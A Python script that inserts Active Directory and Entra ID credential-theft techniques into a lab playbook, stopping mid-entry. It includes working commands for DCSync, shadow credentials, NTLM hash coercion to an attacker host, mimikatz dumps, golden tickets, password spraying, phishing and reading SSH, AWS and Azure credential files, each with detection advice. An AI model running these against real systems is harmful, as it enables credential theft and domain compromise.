import re

filepath = "/home/sanchit/DVWA/docs/03-credential-access.md"

with open(filepath, "r", encoding="utf-8") as f:
    content = f.read()

# 1. Update Title
content = content.replace(
    "# 03 — Credential Access (CRED-001..065)",
    "# 03 — Credential Access (CRED-001..130, CLO-001..095)"
)

# 2. Replacement for CRED-014
cred_014_old = """### CRED-014 — DCSync via `GetChangesAll`
**What it is:** same primitive, higher-tier permission for confidential attributes (e.g. trust passwords, BitLocker keys).
**Why it works here:** `doctor.strange` has it.
**Tools/Steps:** same as CRED-013, with `-just-dc` (full).
**Detection / Prevention:** same as CRED-013."""

cred_014_new = """### CRED-014 — GenericAll on DC computer object
**What it is:** GenericAll permissions over a Domain Controller computer object allow an attacker to modify the computer object's attributes, perform RBCD (Resource-Based Constrained Delegation), or perform Shadow Credentials / write `msDS-KeyCredentialLink` to impersonate the Domain Controller, leading to DCSync.
**Why it works here:** `svc_bobafett2` is granted GenericAll on `coruscant` computer object.
**Tools:** `pyWhisker`, `Certipy`, `impacket-getST`, `Rubeus`.
**Steps:**
```bash
# Write shadow credentials to the DC computer object (coruscant$)
certipy shadow auto -u svc_bobafett2@empire.local -p 'Darryl2024!' -account coruscant$ -dc-ip 10.10.0.10
# Authenticate and retrieve the NT hash of coruscant$
certipy auth -pfx coruscant.pfx -dc-ip 10.10.0.10
# Execute DCSync using the machine hash
impacket-secretsdump -k -no-pass -hashes :<coruscant_nt_hash> empire.local/coruscant\\$@10.10.0.10
```
**Detection:** Event `5136` (Directory Service Object Modified) on the Domain Controller computer object's `msDS-KeyCredentialLink` or `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
**Prevention:** Restrict permissions on Tier 0 computer objects (like DCs). Only Domain Admins and System Administrators should have write access."""

content = content.replace(cred_014_old, cred_014_new)


# 3. Replacement for CRED-022
cred_022_old = """### CRED-022 — PrinterBug / SpoolSample
**What it is:** `RpcRemoteFindFirstPrinterChangeNotificationEx` coerces auth. Works from any authenticated user against any spooler.
**Why it works here:** Print Spooler on by default.
**Tools:** `printerbug.py`, `SpoolSample.exe`, `Coercer`.
**Steps:** see CRED-018 example.
**Detection:** Event `4768` from DC$ to unusual destinations; Print Service Admin Event `808`.
**Prevention:** disable Print Spooler on DCs (KB5005413 — no impact); StopAndDisableHyperVRelayedRPC."""

cred_022_new = """### CRED-022 — PrinterBug / SpoolSample
**What it is:** `RpcRemoteFindFirstPrinterChangeNotificationEx` coerces auth. Works from any authenticated user against any spooler.
**Why it works here:** Print Spooler on by default.
**Tools:** `printerbug.py`, `SpoolSample.exe`, `Coercer`.
**Steps:**
```bash
# Trigger coercion from a domain controller (coruscant) to attacker listener (10.10.0.100)
python3 printerbug.py empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10 10.10.0.100
```
**Detection:** Event `4768` from DC$ to unusual destinations; Print Service Admin Event `808`.
**Prevention:** disable Print Spooler on DCs (KB5005413 — no impact); StopAndDisableHyperVRelayedRPC."""

content = content.replace(cred_022_old, cred_022_new)


# 4. Replacement for CRED-031
cred_031_old = """### CRED-031 — AS-ROAST variant
**What it is:** same as CRED-002 — flagged separately in PLAN.md for `no_preauth_svc`. Same tools."""

cred_031_new = """### CRED-031 — AS-ROAST variant
**What it is:** Request a TGT for an account that does not require pre-authentication, allowing the capture of the AS-REP response which can then be cracked offline.
**Why it works here:** `no_preauth_svc` has "Do not require Kerberos preauthentication" set.
**Tools:** `impacket-GetNPUsers`, `Rubeus`, `hashcat`.
**Steps:**
```bash
impacket-GetNPUsers empire.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip 10.10.0.10
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```
```powershell
.\\Rubeus.exe asreproast /user:no_preauth_svc /outfile:asrep.hashes
```
**Detection:** Event `4768` (Kerberos Authentication Ticket Request) with pre-authentication type 0.
**Prevention:** Uncheck "Do not require Kerberos preauthentication" on all user accounts in Active Directory."""

content = content.replace(cred_031_old, cred_031_new)


# 5. Replacement for CRED-040
cred_040_old = """### CRED-040 — SeTrustedCredManAccessPrivilege → DPAPI
**What it is:** very rare privilege that lets you access Credential Manager for any user.
**Tools:** custom PoCs.
**Detection:** Event `4673` on the privilege.
**Prevention:** never assign this privilege."""

cred_040_new = """### CRED-040 — SeTrustedCredManAccessPrivilege → DPAPI
**What it is:** A highly sensitive privilege (`SeTrustedCredManAccessPrivilege`) that allows a process/user to access the Windows Credential Manager and retrieve stored credentials for all users.
**Why it works here:** `Asset_Owners` group is assigned `SeTrustedCredManAccessPrivilege`.
**Tools:** `secedit`, custom scripts.
**Steps:**
```powershell
# Check if SeTrustedCredManAccessPrivilege is granted
whoami /priv
# Retrieve all stored credentials in PasswordVault using the privilege
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] | Out-Null
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll()
```
**Detection:** Event `4673` (Sensitive Privilege Use) indicating the use of `SeTrustedCredManAccessPrivilege`.
**Prevention:** Never assign `SeTrustedCredManAccessPrivilege` to standard users or service accounts."""

content = content.replace(cred_040_old, cred_040_new)


# 6. Replacement for CRED-050
cred_050_old = """### CRED-050 — DNSSEC ZSK Leak
**What it is:** misstored DNSSEC ZSK → re-sign zone or enumerate names. Edge-case, rarely useful in practice.
**Detection / Prevention:** keep ZSK in HSM; rotate per BCP."""

cred_050_new = """### CRED-050 — DNSSEC ZSK Leak
**What it is:** Active Directory-integrated DNS zones configured with DNSSEC may store the Zone Signing Key (ZSK) in a software key storage provider with weak ACLs. If compromised, an attacker can enumerate the zone or sign rogue records.
**Why it works here:** DNSSEC is enabled but Zone Signing Key (ZSK) is stored in a software key storage provider with weak ACLs.
**Tools:** `dnssec-signzone`, custom scripts, active directory queries.
**Steps:**
```bash
# Retrieve DNSSEC keys from Active Directory
ldapsearch -H ldap://10.10.0.10 -x -b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=empire,DC=local" "(objectClass=dnsZone)"
```
**Detection:** Registry or file access events on DNSSEC key directories (`C:\\Windows\\System32\\dns\\keys\\`).
**Prevention:** Store Zone Signing Keys (ZSK) and Key Signing Keys (KSK) in a Hardware Security Module (HSM). Ensure strict file and directory access control."""

content = content.replace(cred_050_old, cred_050_new)


# 7. Replacement for CRED-052
cred_052_old = """### CRED-052 — NTLM Relay via `.library-ms` (CVE-2025-33073)
**What it is:** chain CRED-051 with `ntlmrelayx` to LDAP/HTTP/SMB target — code exec on relay target.
**Tools:** same as CRED-051 + `ntlmrelayx.py`.
**Steps:**
```bash
ntlmrelayx.py -t ldap://coruscant.empire.local --escalate-user peter.parker -smb2support
# deliver .library-ms via shared archive
```
**Detection / Prevention:** same as CRED-051 + LDAP signing + channel binding."""

cred_052_new = """### CRED-052 — .url shortcut NTLM coercion
**What it is:** A crafted Internet Shortcut (`.url`) file containing an `IconFile` property pointing to an external UNC path. When a user browses the directory containing the file in Windows Explorer, Explorer automatically attempts to retrieve the icon, leaking the user's NetNTLM hash.
**Why it works here:** A `.url` file is placed in the world-readable SYSVOL scripts folder on `coruscant`.
**Tools:** `Responder`, text editor.
**Steps:**
```ini
# Contents of C:\\Windows\\SYSVOL\\sysvol\\empire.local\\scripts\\coerce.url:
[InternetShortcut]
URL=file://10.10.0.100/share
IconFile=\\\\10.10.0.100\\share\\icon.ico
IconIndex=1
```
```bash
# Attacker starts Responder to capture the NetNTLM hash:
sudo responder -I eth0 -vd
```
**Detection:** Event ID `4624` / `4625` indicating NTLM authentication to an external/untrusted IP from a user's workstation.
**Prevention:** Block outbound SMB (port 445) traffic at the network perimeter. Restrict write permissions on SYSVOL and other shared directories."""

content = content.replace(cred_052_old, cred_052_new)


# 8. Replacement for CRED-058
cred_058_old = """### CRED-058 — gMSADumper
**What it is:** Python alternative for CRED-034. Same primitive."""

cred_058_new = """### CRED-058 — gMSADumper
**What it is:** Extract the `msDS-ManagedPassword` attribute of a Group Managed Service Account (gMSA) using python tools, extracting the NT hash of the service account.
**Why it works here:** `nick.fury` (or `Regional Managers`) has rights to retrieve the password for `gmsa_web$`.
**Tools:** `gMSADumper.py`.
**Steps:**
```bash
python3 gMSADumper.py -u peter.parker -p 'EmpireLab2024!' -d empire.local -dc-ip 10.10.0.10
```
**Detection:** Event ID `4662` (An operation was performed on an object) for the gMSA object reading the `msDS-ManagedPassword` attribute.
**Prevention:** Restrict the membership of the group authorized to retrieve the managed password via `PrincipalsAllowedToRetrieveManagedPassword` to only the designated host computer accounts."""

content = content.replace(cred_058_old, cred_058_new)


# 9. Insert new CRED-066..068, CRED-100, CRED-121..130
cred_extra = """

---

### CRED-066 — DPAPI Backup Keys Extraction via LSARPC
**What it is:** The Local Security Authority (LSA) provides an RPC interface (LSARPC) that allows administrators to retrieve the domain's DPAPI backup keys. A compromised backup key allows offline decryption of any user's DPAPI master keys and secrets.
**Why it works here:** Run as Domain Admin or Administrator on a Domain Controller where LSARPC is exposed.
**Tools:** `mimikatz`, `SharpDPAPI`.
**Steps:**
```powershell
.\\mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:coruscant.empire.local /export"
```
**Detection:** Event ID `4662` or `4624` Logon Type 3 with access to key decryption RPC endpoints.
**Prevention:** Isolate Domain Controllers (Tier 0). Restrict RPC access using firewalls and network segmentation.

---

### CRED-067 — CredentialGuard Disabled
**What it is:** Credential Guard uses virtualization-based security to isolate LSASS secrets. If disabled, credentials (like NTLM hashes and Kerberos tickets) remain in the LSASS process memory space, exposing them to memory dump tools.
**Why it works here:** Credential Guard is not enabled (registry setting disabled).
**Tools:** `mimikatz`, `procdump`.
**Steps:**
```powershell
# Check if Credential Guard is running:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning
```
**Detection:** Event ID `1` (Process creation) or auditing of registry changes in `HKLM\\System\\CurrentControlSet\\Control\\Lsa\\LsaCfgFlags`.
**Prevention:** Enable Credential Guard via Group Policy (`Computer Configuration -> Administrative Templates -> System -> Device Guard -> Turn on Virtualization Based Security`).

---

### CRED-068 — LSA Notification Packages Registry Modification
**What it is:** Attackers can register custom LSA Notification Packages (DLLs) via the registry. Upon system reboot, LSA loads these packages, which can intercept plaintext passwords during user authentication.
**Why it works here:** Write permissions allowed on the registry keys or custom DLL dropped in System32.
**Tools:** Custom DLL, `reg` command.
**Steps:**
```cmd
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\\0dvad_notify" /f
```
**Detection:** Event ID `4657` (Registry value modified) for the `Notification Packages` registry value, or Sysmon process loads of unsigned/malicious DLLs in `lsass.exe`.
**Prevention:** Restrict write permissions on the LSA registry keys. Enable Driver/DLL signing enforcement and LSA Protection (RunAsPPL).

---

### CRED-100 — Inter-Realm Ticket Abuse
**What it is:** Forging cross-forest/inter-realm Ticket Granting Tickets (TGTs) using trust keys between Active Directory forests. If SID filtering is disabled, an attacker can inject high-privileged SIDs (like Enterprise Admins) into the forged ticket to compromise the trusting forest.
**Why it works here:** SID filtering is disabled on the forest trust between `empire.local` and `rebel.local`.
**Tools:** `mimikatz`, `Rubeus`.
**Steps:**
```bash
# Forge a Golden Ticket with the target enterprise admin SID across the forest trust
mimikatz "kerberos::golden /user:Administrator /domain:empire.local /sid:S-1-5-21-EMPIRE /sids:S-1-5-21-REBEL-519 /krbtgt:<trust_key_hash> /ptt"
```
**Detection:** Event ID `4769` for a cross-forest Kerberos ticket request containing anomalous SIDs in the PAC.
**Prevention:** Enable SID filtering on all external and forest trusts (`netdom trust /domain:empire.local /to:rebel.local /EnableSIDFiltering:yes`).

---

### CRED-121 — Chrome Saved Passwords
**What it is:** Extracting passwords saved in Google Chrome. Chrome encrypts credentials using the Windows DPAPI master key of the current user.
**Why it works here:** Standard workstation configuration where Chrome is used and DPAPI is accessible.
**Tools:** `SharpChromium`, `mimikatz`.
**Steps:**
```powershell
.\\SharpChromium.exe logins
```
**Detection:** Access to the Chrome database file (`%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data`) by non-Chrome processes.
**Prevention:** Disable built-in browser password saving via Group Policy. Enforce enterprise password manager usage.

---

### CRED-122 — Edge Saved Passwords
**What it is:** Extracting saved passwords from Microsoft Edge, which are encrypted with the user's DPAPI master key.
**Why it works here:** Standard Edge installation with saved passwords allowed.
**Tools:** `SharpChromium`, `mimikatz`.
**Steps:**
```powershell
.\\SharpChromium.exe logins --edge
```
**Detection:** Access to the Edge database file (`%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Login Data`) by non-Edge processes.
**Prevention:** Disable password saving in Edge via GPO.

---

### CRED-123 — Firefox Saved Passwords
**What it is:** Extracting saved passwords from Mozilla Firefox. Firefox encrypts credentials in `logins.json` using a key stored in `key4.db`.
**Why it works here:** Firefox profile directory is accessible.
**Tools:** `firepwd.py`, `LaZagne`.
**Steps:**
```bash
python3 firepwd.py -d C:\\Users\\Administrator\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<profile>
```
**Detection:** Process monitoring of scripts or binaries accessing Firefox profile files (`logins.json`, `key4.db`).
**Prevention:** Force a master password in Firefox or disable saved passwords.

---

### CRED-124 — Windows Credential Manager Entries
**What it is:** Retrieving credentials stored in the Windows Credential Manager. These credentials (saved RDP, network share, or website credentials) are encrypted with the user's DPAPI key.
**Why it works here:** Simulated credentials stored in Credential Manager.
**Tools:** `cmdkey`, `mimikatz`.
**Steps:**
```cmd
cmdkey /list
# Extract using Mimikatz:
mimikatz "privilege::debug" "sekurlsa::credman" exit
```
**Detection:** Auditing DPAPI credential read events, and process command lines invoking `cmdkey.exe /list`.
**Prevention:** Restrict saving of domain credentials in Credential Manager via Group Policy.

---

### CRED-125 — SSH Private Keys in User Profile
**What it is:** Extracting plaintext SSH private keys stored in the default SSH directory (`.ssh`) of user profiles.
**Why it works here:** Plaintext SSH key dropped in `C:\\Users\\Administrator\\.ssh\\id_rsa`.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\\Users\\Administrator\\.ssh\\id_rsa
```
**Detection:** File access monitoring on the `.ssh` folder in user profile paths.
**Prevention:** Enforce passphrase protection on all SSH private keys. Use agent forwarding instead of storing keys locally where possible.

---

### CRED-126 — AWS Credentials File
**What it is:** Extracting AWS access keys and secret keys from the `.aws/credentials` configuration file stored in plaintext within user profile directories.
**Why it works here:** Plaintext AWS credentials file created in the lab.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\\Users\\Administrator\\.aws\\credentials
```
**Detection:** File read monitoring targeting `.aws/credentials` or `.aws/config`.
**Prevention:** Enforce short-lived credentials via IAM Roles or AWS SSO. Do not store long-lived credentials in plaintext config files.

---

### CRED-127 — Azure Credentials File
**What it is:** Extracting Azure CLI or Az PowerShell access tokens and credentials from profile directories (e.g., `~/.azure/accessTokens.json`).
**Why it works here:** Standard Azure CLI tool usage caches access tokens in plaintext files.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\\Users\\Administrator\\.azure\\accessTokens.json
```
**Detection:** Monitoring reads of `accessTokens.json` or `azureProfile.json` by non-CLI processes.
**Prevention:** Use Managed Identities where possible. Restrict access to CLI cache directories.

---

### CRED-128 — Terraform State with Credentials
**What it is:** Extracting plaintext secrets, database passwords, or API keys stored in Terraform state files (`terraform.tfstate`).
**Why it works here:** Terraform state file containing simulated credentials dropped in `C:\\Tools\\terraform.tfstate`.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\\Tools\\terraform.tfstate
```
**Detection:** Non-developer processes reading files with `.tfstate` extension.
**Prevention:** Store Terraform state files in secure remote backends (e.g., AWS S3 with KMS encryption, Terraform Cloud) with restricted permissions, rather than locally.

---

### CRED-129 — KeePass Database in Documents
**What it is:** Locating KeePass password manager databases (`.kdbx`) and extracting them. If the master password is weak or can be dumped from memory, all passwords within can be decrypted.
**Why it works here:** Standard KeePass database storage behavior.
**Tools:** `KeePassHilliard`, `KeeThief`, `keepass-trigger`.
**Steps:**
```powershell
# Find KeePass databases:
Get-ChildItem -Path C:\\Users -Filter *.kdbx -Recurse -ErrorAction SilentlyContinue
```
**Detection:** Process monitoring of memory access to the `KeePass.exe` process (e.g., dumping KeePass memory).
**Prevention:** Enforce strong KeePass master passwords. Use key files or Windows Hello in combination with the password. Keep KeePass updated to mitigate memory dump vulnerabilities.

---

### CRED-130 — .rdp File with Saved Password
**What it is:** Extracting saved passwords from `.rdp` files. The password field is DPAPI-encrypted and stored under the `password 51` property.
**Why it works here:** Simulated RDP connection file placed on the desktop.
**Tools:** `SharpDPAPI`.
**Steps:**
```powershell
.\\SharpDPAPI.exe rdpsg
```
**Detection:** Access to DPAPI master keys and decryption of RDP configuration keys.
**Prevention:** Disable saving of credentials in Remote Desktop Connection settings via GPO.

---"""

# 10. Generate CLO-001..095
clo_list = []

# Detailed active CLO tags mappings
detailed_clo = {
    "CLO-001": {
        "name": "Entra Connect MSOL sync account (over-privileged)",
        "desc": "The MSOL_xxxx account created by Microsoft Entra Connect is often granted excessive on-premises AD permissions, exposing the forest to DCSync attacks if compromised.",
        "works": "MSOL sync account is pre-created with high replication privileges.",
        "tools": "AADInternals, impacket-secretsdump.",
        "steps": "Import-Module AADInternals\\n$creds = Get-AADIntSyncCredentials\\n# Extract with secretsdump:\\nimpacket-secretsdump -just-dc-ntlm EMPIRE/MSOL_sync:EntraSync2024!@10.10.0.10",
        "det": "Event ID 4624 (Successful Logon) or Event ID 4776 (Credential Validation) from anomalous systems for the MSOL account.",
        "prev": "Enforce strict IP restrictions and logon hour limits on the MSOL sync account. Rotate the credentials regularly."
    },
    "CLO-002": {
        "name": "PHS hash sync account (DCSync-capable service account)",
        "desc": "Entra Connect uses the Password Hash Sync (PHS) account to replicate hashes. This account possesses the GetChanges and GetChangesAll replication rights on the domain partition.",
        "works": "GetChanges and GetChangesAll rights granted to the MSOL sync account.",
        "tools": "impacket-secretsdump.",
        "steps": "impacket-secretsdump -just-dc-ntlm -dc-ip 10.10.0.10 empire.local/MSOL_sync:'EntraSync2024!'@10.10.0.10",
        "det": "Event ID 4662 (Replication changes) targeting the domain object originating from non-DC IPs.",
        "prev": "Audit AD replication permissions. Limit sync capability only to authorized Entra Connect hosts."
    },
    "CLO-003": {
        "name": "Pass-through auth agent account",
        "desc": "Entra Pass-Through Authentication (PTA) uses local agents. Compromise of an agent host allows intercepting authentication requests.",
        "works": "PTA agent runs in system context on Member Server.",
        "tools": "PTA Agent console.",
        "steps": "Get-Service -Name \\\"Microsoft Azure AD Connect Authentication Agent\\\"",
        "det": "Unauthorized agent registration alerts in the Entra ID administration portal.",
        "prev": "Strictly restrict administrative access to PTA agent servers (Tier 0)."
    },
    "CLO-004": {
        "name": "AADC sync service account with high AD rights",
        "desc": "Azure AD Connect sync account is occasionally granted write permissions over AD objects, enabling unauthorized password resets.",
        "works": "Write permissions granted over User OUs.",
        "tools": "ActiveDirectory PowerShell.",
        "steps": "Get-Acl \\\"AD:DC=empire,DC=local\\\" | Select-Object -ExpandProperty Access | Where-Object { \\$_.IdentityReference -match 'MSOL_sync' }",
        "det": "Event ID 5136 showing write modification to user passwords/groups by the sync account.",
        "prev": "Implement Least Privilege; restrict the sync account from modifying sensitive admin groups."
    },
    "CLO-005": {
        "name": "Seamless SSO account (AZUREADSSOACC$)",
        "desc": "Seamless SSO utilizes a computer account (AZUREADSSOACC$) with a weak, static Kerberos key, opening a surface for ticket forgery.",
        "works": "Seamless SSO is enabled, creating a static computer account password.",
        "tools": "impacket-GetUserSPNs, hashcat.",
        "steps": "impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -request -dc-ip 10.10.0.10",
        "det": "Event ID 4769 targeting the AZUREADSSOACC$ account with RC4 (0x17) encryption.",
        "prev": "Roll over the Kerberos decryption key for the AZUREADSSOACC computer account regularly (every 30 days)."
    },
    "CLO-006": {
        "name": "Directory sync account readable without auth",
        "desc": "Permissions on AD Sync directories or registry hives containing decrypted/decrypted sync passwords might be misconfigured.",
        "works": "Weak permissions on AD Sync install directory.",
        "tools": "Get-Acl.",
        "steps": "Get-Acl \\\"C:\\\\Program Files\\\\Microsoft Azure AD Sync\\\" | Format-List",
        "det": "Audit checks on directory and registry access events for the Sync service folder.",
        "prev": "Enforce strict ACLs on the AD Sync installation folder and registry keys."
    },
    "CLO-007": {
        "name": "MSOL account password reuse detection",
        "desc": "Sync account passwords reused across multiple administrative interfaces or secondary service accounts.",
        "works": "Static passwords reused.",
        "tools": "Netexec / nxc.",
        "steps": "nxc smb 10.10.0.10 -u Administrator -p 'EntraSync2024!'",
        "det": "Logon validation events (4624) on multiple hosts using the same service account credentials.",
        "prev": "Generate strong, unique, randomized passwords for all service accounts."
    },
    "CLO-008": {
        "name": "Entra Connect plaintext credentials in registry/config",
        "desc": "Entra Connect stores sync configurations and credentials in the local database or registry. Admin access allows decryption.",
        "works": "DPAPI-encrypted configurations are decryptable by local Administrator.",
        "tools": "AADInternals.",
        "steps": "Import-Module AADInternals\\nGet-AADIntSyncCredentials",
        "det": "Processes calling CryptUnprotectData targeting AD Sync configuration paths.",
        "prev": "Restrict local administrator rights on the Entra Connect server. Enable Credential Guard."
    },
    "CLO-009": {
        "name": "AAD Password Protection DC Agent — audit mode only",
        "desc": "Deploying Azure AD Password Protection in Audit mode prevents weak password selection from being actively blocked on-premises.",
        "works": "Registry key configured for Audit mode instead of Enforce.",
        "tools": "Get-ItemProperty.",
        "steps": "Get-ItemProperty -Path \\\"HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\AzureADPasswordProtectionDCAgent\\\\Parameters\\\"",
        "det": "Event ID 10014 or 10025 showing password validation in audit mode.",
        "prev": "Set Password Protection DC Agent to 'Enforced' mode."
    },
    "CLO-010": {
        "name": "Entra Connect admin accounts without MFA (note)",
        "desc": "Failing to enforce Multi-Factor Authentication on hybrid identity administrators allows takeover via credential leakage.",
        "works": "Conditional Access policy excludes sync administrators from MFA.",
        "tools": "az CLI.",
        "steps": "az login -u admin@corplab.onmicrosoft.com -p 'Password!'",
        "det": "Entra ID sign-in logs showing Global Admins authenticating successfully without MFA.",
        "prev": "Enforce MFA for all directory sync and administrative roles using Conditional Access."
    },
    "CLO-021": {
        "name": "Hybrid join SCP (Service Connection Point) in AD",
        "desc": "Service Connection Points dictate device join registration. Insecure write permissions on the Configuration partition allow rogue redirection.",
        "works": "Write permission granted to Authenticated Users on Configuration path.",
        "tools": "ActiveDirectory PowerShell.",
        "steps": "Get-ADObject -SearchBase \\\"CN=Configuration,DC=empire,DC=local\\\" -Filter \\\"objectClass -eq 'serviceConnectionPoint'\\\" -Properties keywords",
        "det": "Directory Service modification events (5136) on the SCP registration objects.",
        "prev": "Strictly control permissions over the AD Configuration partition."
    },
    "CLO-022": {
        "name": "PRT (Primary Refresh Token) theft surface",
        "desc": "The Primary Refresh Token (PRT) allows seamless SSO. If extracted, it grants access to cloud resources as the victim without triggering MFA.",
        "works": "PRT stored in LSASrv process memory.",
        "tools": "mimikatz, ROADtools.",
        "steps": "mimikatz # sekurlsa::cloudap\\nmimikatz # token::enumerate + cloudap\\nroadrecon auth --prt <token> --prt-context <context>",
        "det": "Anomalous LSASS memory accesses from unsigned processes. Cookies/tokens used from unexpected external IPs.",
        "prev": "Enable Credential Guard to isolate CloudAP tokens. Enforce device compliance verification."
    },
    "CLO-023": {
        "name": "Device registration service abuse",
        "desc": "Weak device registration settings in Microsoft Entra allow rogue or unmanaged devices to register without multi-factor verification.",
        "works": "Entra portal enables device registration for all users without MFA.",
        "tools": "ROADtools, AADInternals.",
        "steps": "roadrecon auth -u user@domain.com -p 'Password!'",
        "det": "Audit logs showing multiple registrations in a short timeframe from a single user.",
        "prev": "Enforce MFA for device registration and limit registration rights to specific users."
    },
    "CLO-024": {
        "name": "Entra ID conditional access token replay",
        "desc": "Access tokens and session cookies hijacked from trusted/compliant devices can be replayed to bypass access controls.",
        "works": "Lack of Token Binding or continuous authentication checks.",
        "tools": "TokenTactics, ROADtools.",
        "steps": "roadrecon auth --access-token <stolen_token>",
        "det": "Anomalous connections showing matching session identifiers from divergent geographic IP addresses.",
        "prev": "Implement Continuous Access Evaluation (CAE) and enforce device compliance requirements."
    },
    "CLO-025": {
        "name": "Hybrid join machine certificate trust",
        "desc": "Exportable machine certificates used for hybrid join allow attackers to clone device identities and bypass compliant device checks.",
        "works": "Private key of device certificate is marked as exportable.",
        "tools": "Export-PfxCertificate.",
        "steps": "Get-ChildItem Cert:\\\\LocalMachine\\\\My | Export-PfxCertificate -Password \\$pwd -FilePath device.pfx",
        "det": "Event ID 1006 indicating private key export of machine certificates.",
        "prev": "Configure non-exportable certificate templates for device enrollment. Store keys in TPM."
    },
    "CLO-026": {
        "name": "WHFB (Windows Hello for Business) key abuse",
        "desc": "Registering an unauthorized public key inside the user's `msDS-KeyCredentialLink` attribute allows certificate authentication (PKINIT) as that user.",
        "works": "Write permission delegated on the msDS-KeyCredentialLink attribute of target users.",
        "tools": "pywhfb.",
        "steps": "python3 pywhfb.py --target tatooine\\$ --dc-ip 10.10.0.10",
        "det": "Event ID 5136 indicating modification of `msDS-KeyCredentialLink`.",
        "prev": "Limit write permission on user computer object attributes in Active Directory."
    },
    "CLO-027": {
        "name": "Entra ID SSPR account takeover",
        "desc": "Self-Service Password Reset (SSPR) settings accepting weak methods or relying on compromised on-premises synchronized objects.",
        "works": "Insecure authentication methods allowed for SSPR.",
        "tools": "Web browser.",
        "steps": "Trigger SSPR flow for a user via public SSPR portal",
        "det": "SSPR audit logs indicating password resets from anomalous IP locations.",
        "prev": "Configure strong password reset methods and enforce MFA registration policies."
    },
    "CLO-028": {
        "name": "Entra ID password spray via legacy auth (Basic auth)",
        "desc": "Legacy authentication protocols do not support MFA. Attacking legacy endpoints allows bypassing access control policies.",
        "works": "Legacy authentication (SMTP/IMAP) enabled in the tenant.",
        "tools": "o365spray.",
        "steps": "python3 o365spray.py --spray --userfile users.txt --password 'SithLord123!' --domain corplab.onmicrosoft.com --protocol activesync",
        "det": "A high frequency of failed logins to legacy endpoints in Entra ID sign-in logs.",
        "prev": "Disable legacy authentication protocols globally in Entra ID."
    },
    "CLO-029": {
        "name": "Token theft via evilginx2 / modlishka reverse proxy",
        "desc": "Reverse proxy phishing tools intercept authentication requests, capturing plaintext passwords and session cookies.",
        "works": "Lack of FIDO2 phishing-resistant authentication.",
        "tools": "evilginx2.",
        "steps": "sudo evilginx2",
        "det": "Sign-ins with valid MFA sessions from external untrusted proxy IP locations.",
        "prev": "Deploy phishing-resistant MFA (FIDO2 / WebAuthn / certificate-based authentication)."
    },
    "CLO-030": {
        "name": "OAuth token leakage via hybrid app",
        "desc": "Consent prompts granting excessive API permissions to malicious multi-tenant applications leads to persistent resource access.",
        "works": "User consent enabled for all applications.",
        "tools": "Malicious App Consent.",
        "steps": "Lure user to authorize application consent prompt",
        "det": "Audit events for 'Consent to application' indicating high-privilege access permissions.",
        "prev": "Disable user-level consent. Enforce administrator approval for all application registrations."
    },
    "CLO-041": {
        "name": "Entra ID App Registration Client Secret Theft",
        "desc": "Storing application credentials or client secrets in plaintext settings files allows unauthorized API access.",
        "works": "Secrets stored in configuration files (appsettings.json, web.config).",
        "tools": "Azure CLI.",
        "steps": "az ad app list --all\\n# Exchange secret for token:\\ncurl -X POST https://login.microsoftonline.com/<tenant_id>/oauth2/v2.0/token -d \\\"client_id=<client_id>&scope=https://graph.microsoft.com/.default&client_secret=<client_secret>&grant_type=client_credentials\\\"",
        "det": "Token generation events using client secrets from unexpected administrative IPs.",
        "prev": "Store application secrets securely in Key Vaults and use Managed Identities."
    },
    "CLO-055": {
        "name": "Entra ID Service Principal Abuse",
        "desc": "Over-privileged service principals with Application.ReadWrite.All or Directory.ReadWrite.All can be hijacked to elevate privileges.",
        "works": "Excessive API permissions assigned to a service principal.",
        "tools": "AzureAD PowerShell.",
        "steps": "Import-Module AzureAD\\nNew-AzureADServicePrincipalPasswordCredential -ObjectId <SP_ID> -Value 'Pwned123!'",
        "det": "Adding password credentials to a service principal from an anomalous administrative session.",
        "prev": "Audit API permissions regularly. Restrict access to Service Principal owner configurations."
    },
    "CLO-061": {
        "name": "Conditional Access Policy Bypass Techniques",
        "desc": "Bypassing CA policies using legacy auth protocols, device compliance spoofing, or location manipulation.",
        "works": "CA policies configured with exceptions or missing legacy auth blocking.",
        "tools": "AADInternals.",
        "steps": "Invoke-AADIntPhishing -Recipients luke.skywalker@empire.local -Subject \\\"Password Reset\\\" -LinkText \\\"Reset Password\\\" -Sender \\\"it@empire.local\\\"",
        "det": "Anomalous sign-ins marked as successful CA verification from unrecognized IPs.",
        "prev": "Ensure CA policies block legacy auth, enforce compliant devices, and restrict exceptions."
    },
    "CLO-071": {
        "name": "Azure Token Theft and Replay",
        "desc": "Access and refresh tokens cached locally on developer endpoints can be extracted and replayed offline.",
        "works": "CLI or PowerShell caches tokens in local profiles.",
        "tools": "TokenTactics.",
        "steps": "Invoke-RefreshToMSGraphToken -RefreshToken <rt> -tenantid <tid>",
        "det": "Graph API operations performed using stolen tokens from unrecognized external networks.",
        "prev": "Enforce short session lifetimes and use Continuous Access Evaluation (CAE)."
    },
    "CLO-081": {
        "name": "On-Prem → Cloud Escalation Chain",
        "desc": "Full escalation chain moving from Active Directory compromise to hybrid synchronization decryption to global tenant takeover.",
        "works": "AD Sync decryption keys are readable by Domain Administrator.",
        "tools": "impacket-secretsdump, AADInternals.",
        "steps": "impacket-secretsdump EMPIRE/MSOL_sync:EntraSync2024!@10.10.0.10\\nGet-AADIntSyncCredentials -Server coruscant.empire.local",
        "det": "Exporting sync database encryption keys or reading sensitive sync secrets.",
